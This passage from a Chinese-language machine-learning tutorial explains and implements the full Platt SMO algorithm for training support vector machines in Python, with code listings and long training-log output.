38</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 39</div><div class="line">j not moving enough</div><div class="line">iter: 39 i:55, pairs changed 1</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 3</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 4</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 5</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 6</div><div class="line">j not moving enough</div><div class="line">iter: 6 i:54, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 2</div><div class="line">iter: 2 i:17, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 3</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 4</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 5</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 6</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 7</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 8</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 9</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 10</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 11</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 12</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 13</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 14</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 15</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 16</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 17</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 18</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 19</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 20</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 21</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 22</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 23</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 24</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 25</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 26</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 27</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 28</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 29</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 30</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 31</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 32</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 33</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 34</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 35</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 36</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 37</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 38</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 39</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 40</div></pre></td></tr></table></figure></p>
<p>一旦运行结束，我们可以观察：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; b</div><div class="line">matrix([[-3.80280169]])</div></pre></td></tr></table></figure></p>
<p>我们可以直接观察alpha矩阵本身，但是由于其是一个稀疏矩阵。我们可以观察其大于0的元素以及数量：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; alphas[alphas&gt;0]</div><div class="line">matrix([[ 0.09156089,  0.27271215,  0.04642864,  0.31783978]])</div></pre></td></tr></table></figure></p>
<p>由于SMO的随机性，我们得到的数据可能不一样。在原是数据及上对这些支持向量标记之后是这样的：</p>
<p><img src="/wp-content/uploads/2016/07/SMO-example.png" alt="SMO example"></p>
<p>而经过实测发现时间还是略长的。所以我们还是需要完整的SMO算法来加快其运算速度。</p>
<h1 id="利用完整的Platt-SMO算法加速优化"><a href="#利用完整的Platt-SMO算法加速优化" class="headerlink" title="利用完整的Platt SMO算法加速优化"></a>利用完整的Platt SMO算法加速优化</h1><p>在小规模的数据范围内运行简化版的SMO自然是没什么问题的，但是一旦数据集过大就容易GG。现在我们就开始讨论完整版的Platt SMO算法。在这两个版本中，实现alpha的更改和代数运算的优化算法一模一样。在优化过程中，唯一的不同就是选择<code>alpha</code>的方法。完整版的Platt SMO算法应用了一些能够提速的启发方法。</p>
<p>Platt SMO算法是通过一个外循环来选择第一个<code>alpha</code>值的，并且其选择过程会在两种方式之间进行交替：一种方式是在所有数据集上进行单遍扫描，另一种方式则是在非边界<code>alpha</code>中实现单遍扫描。而所谓费边界alpha指的是那些不等于边界0或者C的<code>alpha</code>值。对整个数据集的扫描相当容易，而实现非边界<code>alpha</code>值的扫描的时候，首先需要建立这些<code>alpha</code>值的列表，然后再对这些表进行遍历。同事，这个步骤可以跳过那些已知的不会改变的<code>alpha</code>值。</p>
<p>在选择第一个值<code>alpha</code>后，算法会通过一个内循环来选择第二个<code>alpha</code>值。在优化过程中，会通过最大化步长的方式来获得第二个<code>alpha</code>值。在简化版SMO算法中，我们会在选择j之后计算错误率<code>Ej</code>。但在这里，我们会建立一个全局的缓存用于保存误差值，并从中选择使得步长或者<code>Ei-Ej</code>最大的<code>alpha</code>值。</p>
<p>所以我们应该包含用于清理代码的数据结构和3个用于对E缓存的辅助函数。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">optStruct</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,dataMatIn, classLabels, C, toler, kTup)</span>:</span>  <span class="comment"># Initialize the structure with the parameters </span></div><div class="line">        self.X = dataMatIn</div><div class="line">        self.labelMat = classLabels</div><div class="line">        self.C = C</div><div class="line">        self.tol = toler</div><div class="line">        self.m = shape(dataMatIn)[<span class="number">0</span>]</div><div class="line">        self.alphas = mat(zeros((self.m,<span class="number">1</span>)))</div><div class="line">        self.b = <span class="number">0</span></div><div class="line">        self.eCache = mat(zeros((self.m,<span class="number">2</span>))) <span class="comment">#first column is valid flag</span></div><div class="line">        self.K = mat(zeros((self.m,self.m)))</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(self.m):</div><div class="line">            self.K[:,i] = kernelTrans(self.X, self.X[i,:], kTup)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcEk</span><span class="params">(oS, k)</span>:</span></div><div class="line">    fXk = float(multiply(oS.alphas,oS.labelMat).T*oS.K[:,k] + oS.b)</div><div class="line">    Ek = fXk - float(oS.labelMat[k])</div><div class="line">    <span class="keyword">return</span> Ek</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">selectJ</span><span class="params">(i, oS, Ei)</span>:</span>         <span class="comment">#this is the second choice -heurstic, and calcs Ej</span></div><div class="line">    maxK = <span class="number">-1</span>; maxDeltaE = <span class="number">0</span>; Ej = <span class="number">0</span></div><div class="line">    oS.eCache[i] = [<span class="number">1</span>,Ei]  <span class="comment">#set valid #choose the alpha that gives the maximum delta E</span></div><div class="line">    validEcacheList = nonzero(oS.eCache[:,<span class="number">0</span>].A)[<span class="number">0</span>]</div><div class="line">    <span class="keyword">if</span> (len(validEcacheList)) &gt; <span class="number">1</span>:</div><div class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> validEcacheList:   <span class="comment">#loop through valid Ecache values and find the one that maximizes delta E</span></div><div class="line">            <span class="keyword">if</span> k == i: <span class="keyword">continue</span> <span class="comment">#don't calc for i, waste of time</span></div><div class="line">            Ek = calcEk(oS, k)</div><div class="line">            deltaE = abs(Ei - Ek)</div><div class="line">            <span class="keyword">if</span> (deltaE &gt; maxDeltaE):</div><div class="line">                maxK = k; maxDeltaE = deltaE; Ej = Ek</div><div class="line">        <span class="keyword">return</span> maxK, Ej</div><div class="line">    <span class="keyword">else</span>:   <span class="comment">#in this case (first time around) we don't have any valid eCache values</span></div><div class="line">        j = selectJrand(i, oS.m)</div><div class="line">        Ej = calcEk(oS, j)</div><div class="line">    <span class="keyword">return</span> j, Ej</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">updateEk</span><span class="params">(oS, k)</span>:</span><span class="comment">#after any alpha has changed update the new value in the cache</span></div><div class="line">    Ek = calcEk(oS, k)</div><div class="line">    oS.eCache[k] = [<span class="number">1</span>,Ek]</div></pre></td></tr></table></figure></p>
<p>首要的事情就是建立一个数据结构来保存所有的重要值，而这个过程可以通过一个对象来完成。这里使用对象的目的是为了作为一个数据结构来使用对象。这样数据就可以通过一个对象来进行传递。实际上，当完成其实现时，可以容易通过Python的字典来完成。但是在访问对象成员变量时，这样做会有更多的手工输入操作，所以我们还是使用一个包含<code>__init__</code>的方法的<code>optStruct</code>类。该方法可以实现成员变量的填充。除了增加一个(m\times 2)的矩阵或者<code>eCache</code>外，这些做法和简化版的SMO一模一样。<code>eCache</code>的第一列给出的是<code>eCache</code>是否有效的标志位，而第二列给出的是实际的E值。</p>
<p>对于给定的<code>alpha</code>值，第一个辅助函数<code>calcEK()</code>能够计算E值并且返回。以前，这个过程是采用内嵌的方法来完成的，但是由于这个过程在这个版本的SMO算法中出现频繁，所以还是写成函数比较好。</p>
<p>下一个函数<code>selectJ()</code>用于选择第二个<code>alpha</code>或者内循环中的<code>alpha</code>值。回想一下，这里的目标实际上是选择第二个<code>alpha</code>值以保证每次优化中采用最大步长。这个函数的误差值与第一个<code>alpha</code>值<code>Ei</code>和下标<code>i</code>有关。首先将输入值Ei缓存中设置为长期有效的，也就是说其一直都是计算好的。在eCache中，代码<code>nonzero(oS.eCache[:,0].A)[0]</code>构建除了一个非零表。<code>nonzero()</code>返回了一个列表，这个列表包含以输入列表为目录的列表值，非零。<code>nozero()</code>语句返回的是非零E值所对应的<code>alpha</code>值，而不是<code>E</code>本身。程序会在所有值上进行循环并选择其中使得改变最大的那个值。如果这是第一个循环，那么就随机选择一个<code>alpha</code>值。当然，也有其他的方法。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">innerL</span><span class="params">(i, oS)</span>:</span></div><div class="line">    Ei = calcEk(oS, i)</div><div class="line">    <span class="keyword">if</span> ((oS.labelMat[i]*Ei &lt; -oS.tol) <span class="keyword">and</span> (oS.alphas[i] &lt; oS.C)) <span class="keyword">or</span> ((oS.labelMat[i]*Ei &gt; oS.tol) <span class="keyword">and</span> (oS.alphas[i] &gt; <span class="number">0</span>)):</div><div class="line">        j,Ej = selectJ(i, oS, Ei) <span class="comment">#this has been changed from selectJrand</span></div><div class="line">        alphaIold = oS.alphas[i].copy(); alphaJold = oS.alphas[j].copy();</div><div class="line">        <span class="keyword">if</span> (oS.labelMat[i] != oS.labelMat[j]):</div><div class="line">            L = max(<span class="number">0</span>, oS.alphas[j] - oS.alphas[i])</div><div class="line">            H = min(oS.C, oS.C + oS.alphas[j] - oS.alphas[i])</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            L = max(<span class="number">0</span>, oS.alphas[j] + oS.alphas[i] - oS.C)</div><div class="line">            H = min(oS.C, oS.alphas[j] + oS.alphas[i])</div><div class="line">        <span class="keyword">if</span> L==H: <span class="keyword">print</span> <span class="string">"L==H"</span>; <span class="keyword">return</span> <span class="number">0</span></div><div class="line">        eta = <span class="number">2.0</span> * oS.K[i,j] - oS.K[i,i] - oS.K[j,j] <span class="comment">#changed for kernel</span></div><div class="line">        <span class="keyword">if</span> eta &gt;= <span class="number">0</span>: <span class="keyword">print</span> <span class="string">"eta&gt;=0"</span>; <span class="keyword">return</span> <span class="number">0</span></div><div class="line">        oS.alphas[j] -= oS.labelMat[j]*(Ei - Ej)/eta</div><div class="line">        oS.alphas[j] = clipAlpha(oS.alphas[j],H,L)</div><div class="line">        updateEk(oS, j) <span class="comment">#added this for the Ecache</span></div><div class="line">        <span class="keyword">if</span> (abs(oS.alphas[j] - alphaJold) &lt; <span class="number">0.00001</span>): <span class="keyword">print</span> <span class="string">"j not moving enough"</span>; <span class="keyword">return</span> <span class="number">0</span></div><div class="line">        oS.alphas[i] += oS.labelMat[j]*oS.labelMat[i]*(alphaJold - oS.alphas[j])<span class="comment">#update i by the same amount as j</span></div><div class="line">        updateEk(oS, i) <span class="comment">#added this for the Ecache                    #the update is in the oppostie direction</span></div><div class="line">        b1 = oS.b - Ei- oS.labelMat[i]*(oS.alphas[i]-alphaIold)*oS.K[i,i] - oS.labelMat[j]*(oS.alphas[j]-alphaJold)*oS.K[i,j]</div><div class="line">        b2 = oS.b - Ej- oS.labelMat[i]*(oS.alphas[i]-alphaIold)*oS.K[i,j]- oS.labelMat[j]*(oS.alphas[j]-alphaJold)*oS.K[j,j]</div><div class="line">        <span class="keyword">if</span> (<span class="number">0</span> &lt; oS.alphas[i]) <span class="keyword">and</span> (oS.C &gt; oS.alphas[i]): oS.b = b1</div><div class="line">        <span class="keyword">elif</span> (<span class="number">0</span> &lt; oS.alphas[j]) <span class="keyword">and</span> (oS.C &gt; oS.alphas[j]): oS.b = b2</div><div class="line">        <span class="keyword">else</span>: oS.b = (b1 + b2)/<span class="number">2.0</span></div><div class="line">        <span class="keyword">return</span> <span class="number">1</span></div><div class="line">    <span class="keyword">else</span>: <span class="keyword">return</span> <span class="number">0</span></div></pre></td></tr></table></figure></p>
<p>程序清单的代码几乎和之前给出的<code>smoSimple()</code>的函数一模一样，但是这里的代码已经使用了自己的数据结构。这个结构在参数<code>oS</code>中传递。第二个重要的修改就是使用程序清单的<code>selectJ</code>来选择第二个<code>alpha</code>的值。最后在<code>alpha</code>值改变的时候更新<code>Ecache</code>。程序订单把上述过程打包在一起的代码片段。这就是选择第一个<code>alpha</code>值的外循环。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">def smoP(dataMatIn, classLabels, C, toler, maxIter,kTup=(&apos;lin&apos;, 0)):    #full Platt SMO</div><div class="line">    oS = optStruct(mat(dataMatIn),mat(classLabels).transpose(),C,toler, kTup)</div><div class="line">    iter = 0</div><div class="line">    entireSet = True; alphaPairsChanged = 0</div><div class="line">    while (iter &lt; maxIter) and ((alphaPairsChanged &gt; 0) or (entireSet)):</div><div class="line">        alphaPairsChanged = 0</div><div class="line">        if entireSet:   #go over all</div><div class="line">            for i in range(oS.m):        </div><div class="line">                alphaPairsChanged += innerL(i,oS)</div><div class="line">                print &quot;fullSet, iter: %d i:%d, pairs changed %d&quot; % (iter,i,alphaPairsChanged)</div><div class="line">            iter += 1</div><div class="line">        else:#go over non-bound (railed) alphas</div><div class="line">            nonBoundIs = nonzero((oS.alphas.A &gt; 0) * (oS.alphas.A &lt; C))[0]</div><div class="line">            for i in nonBoundIs:</div><div class="line">                alphaPairsChanged += innerL(i,oS)</div><div class="line">                print &quot;non-bound, iter: %d i:%d, pairs changed %d&quot; % (iter,i,alphaPairsChanged)</div><div class="line">            iter += 1</div><div class="line">        if entireSet: entireSet = False #toggle entire set loop</div><div class="line">        elif (alphaPairsChanged == 0): entireSet = True  </div><div class="line">        print &quot;iteration number: %d&quot; % iter</div><div class="line">    return oS.b,oS.alphas</div></pre></td></tr></table></figure></p>
<p>程序清单给出的是完整的Platt SMO算法，其输入和函数<code>smoSimple()</code>完全一样。函数一开始构建一个数据结构来容纳所有的数据，然后需要对控制函数退出的一些变量进行初始化。整个代码的主体是<code>while</code>循环，这与<code>smoSimple()</code>有些类似，但是这里的循环退出条件就更多一些。如果整个代码的主体是<code>while</code>循环，这与<code>smoSimple()</code>有些类似，但是哲理的循环条件退出条件就更多一些。当迭代次数超过指定的最大值，或者遍历整个集合都未对任何<code>alpha</code>值进行修改的时候，就退出循环。这里的<code>maxIter</code>变量和函数<code>smoSimple()</code>中的作用有一点不同，后者当没有任何<code>alpha</code>发生改变时会将整个集合的第一次遍历过程记成一次迭代，而这里的一次迭代定义为一次循环过程，而不论其做了什么事情。此时，如果在优化过程中存在波动就会停止，因此这里的做法优于<code>smoSimple()</code>函数中的计数方法。</p>
<p><code>while</code>循环的内部与<code>smoSimple()</code>有所不同，一开始的<code>for</code>循环在数据集上遍历任何可能的<code>alpha</code>。我们通过调用<code>innerL()</code>来选择第二个<code>alpha</code>，并在可能时候对其进行优化处理，如果有任意一对<code>alpha</code>值发生改变，那么就会返回1.第二个<code>for</code>循环遍历所有的非边界<code>alpha</code>值，也就是不再边界0或者C上的值。</p>
<p>接下来，我们对for循环在非边界循环和完整遍历之间进行切换，并打印出迭代次数。最后程序将会返回常数b和<code>alpha</code>值。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>dataArr,labelArr=svmMLiA.loadDataSet(<span class="string">'testSet.txt'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>b,alphas=svmMLiA.smoP(dataArr,labelArr,<span class="number">0.6</span>,<span class="number">0.001</span>,<span class="number">40</span>)</div></pre></td></tr></table></figure></p>
<p>然后可以得出下面的结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div></pre></td><td class="code"><pre><div class="line">fullSet, iter: 0 i:0, pairs changed 1</div><div class="line">fullSet, iter: 0 i:1, pairs changed 1</div><div class="line">fullSet, iter: 0 i:2, pairs changed 2</div><div class="line">fullSet, iter: 0 i:3, pairs changed 3</div><div class="line">L==H</div><div class="line">fullSet, iter: 0 i:4, pairs changed 3</div><div class="line">L==H</div><div class="line">fullSet, iter: 0 i:5, pairs changed 3</div><div class="line">L==H</div><div class="line">fullSet, iter: 0 i:6, pairs changed 3</div><div class="line">fullSet, iter: 0 i:7, pairs changed 3</div><div class="line">fullSet, iter: 0 i:8, pairs changed 4</div><div class="line">fullSet, iter: 0 i:9, pairs changed 4</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 0 i:10, pairs changed 4</div><div class="line">fullSet, iter: 0 i:11, pairs changed 4</div><div class="line">fullSet, iter: 0 i:12, pairs changed 4</div><div class="line">fullSet, iter: 0 i:13, pairs changed 4</div><div class="line">fullSet, iter: 0 i:14, pairs changed 4</div><div class="line">fullSet, iter: 0 i:15, pairs changed 4</div><div class="line">fullSet, iter: 0 i:16, pairs changed 4</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 0 i:17, pairs changed 4</div><div class="line">L==H</div><div class="line">fullSet, iter: 0 i:18, pairs changed 4</div><div class="line">fullSet, iter: 0 i:19, pairs changed 4</div><div class="line">fullSet, iter: 0 i:20, pairs changed 4</div><div class="line">fullSet, iter: 0 i:21, pairs changed 4</div><div class="line">fullSet, iter: 0 i:22, pairs changed 4</div><div class="line">fullSet, iter: 0 i:23, pairs changed 5</div><div class="line">fullSet, iter: 0 i:24, pairs changed 5</div><div class="line">L==H</div><div class="line">fullSet, iter: 0 i:25, pairs changed 5</div><div class="line">L==H</div><div class="line">fullSet, iter: 0 i:26, pairs changed 5</div><div class="line">fullSet, iter: 0 i:27, pairs changed 5</div><div class="line">fullSet, iter: 0 i:28, pairs changed 5</div><div class="line">fullSet, iter: 0 i:29, pairs changed 5</div><div class="line">fullSet, iter: 0 i:30, pairs changed 5</div><div class="line">L==H</div><div class="line">fullSet, iter: 0 i:31, pairs changed 5</div><div class="line">fullSet, iter: 0 i:32, pairs changed 5</div><div class="line">fullSet, iter: 0 i:33, pairs changed 5</div><div class="line">L==H</div><div class="line">fullSet, iter: 0 i:34, pairs changed 5</div><div class="line">fullSet, iter: 0 i:35, pairs changed 5</div><div class="line">fullSet, iter: 0 i:36, pairs changed 5</div><div class="line">fullSet, iter: 0 i:37, pairs changed 5</div><div class="line">fullSet, iter: 0 i:38, pairs changed 5</div><div class="line">L==H</div><div class="line">fullSet, iter: 0 i:39, pairs changed 5</div><div class="line">fullSet, iter: 0 i:40, pairs changed 5</div><div class="line">fullSet, iter: 0 i:41, pairs changed 5</div><div class="line">fullSet, iter: 0 i:42, pairs changed 5</div><div class="line">fullSet, iter: 0 i:43, pairs changed 5</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 0 i:44, pairs changed 5</div><div class="line">L==H</div><div class="line">fullSet, iter: 0 i:45, pairs changed 5</div><div class="line">L==H</div><div class="line">fullSet, iter: 0 i:46, pairs changed 5</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 0 i:47, pairs changed 5</div><div class="line">fullSet, iter: 0 i:48, pairs changed 5</div><div class="line">fullSet, iter: 0 i:49, pairs changed 5</div><div class="line">j not moving enough</div><div class="line">fullSet, iter: 0 i:50, pairs changed 5</div><div class="line">L==H</div><div class="line">fullSet, iter: 0 i:51, pairs changed 5</div><div class="line">L==H</div><div class="line">fullSet, iter: 0 i:52, pairs changed 5</div><div class="line">fullSet, iter: 0 i:53, pairs changed 5</div><div class="line">fullSet, iter: 0 i:54, pairs changed 6</div><div class="line">L==H</div><div class="line">fullSet, iter: 0 i:55, pairs changed 6</div><div class="line">fullSet, iter: 0 i:56, pairs changed 6</div><div class="line">fullSet, iter: 0 i:57, pairs changed 6</div><div class="line">fullSet, iter: 0 i:58, pairs changed 6</div><div class="line">fullSet, iter: 0 i:59, pairs changed 6</div><div class="line">fullSet, iter: 0 i:60, pairs changed 6</div><div class="line">fullSet, iter: 0 i:61, pairs changed 6</div><div class="line">fullSet, iter: 0 i:62, pairs changed 6</div><div class="line">fullSet, iter: 0 i:63, pairs changed 6</div><div class="line">fullSet, iter: 0 i:64, pairs changed 6</div><div class="line">fullSet, iter: 0 i:65, pairs changed 6</div><div class="line">fullSet, iter: 0 i:66, pairs changed 6</div><div class="line">fullSet, iter: 0 i:67, pairs changed 6</div><div class="line">fullSet, iter: 0 i:68, pairs changed 6</div><div class="line">fullSet, iter: 0 i:69, pairs changed 6</div><div class="line">fullSet, iter: 0 i:70, pairs changed 6</div><div class="line">fullSet, iter: 0 i:71, pairs changed 6</div><div class="line">fullSet, iter: 0 i:72, pairs changed 6</div><div class="line">fullSet, iter: 0 i:73, pairs changed 6</div><div class="line">fullSet, iter: 0 i:74, pairs changed 6</div><div class="line">fullSet, iter: 0 i:75, pairs changed 6</div><div class="line">fullSet, iter: 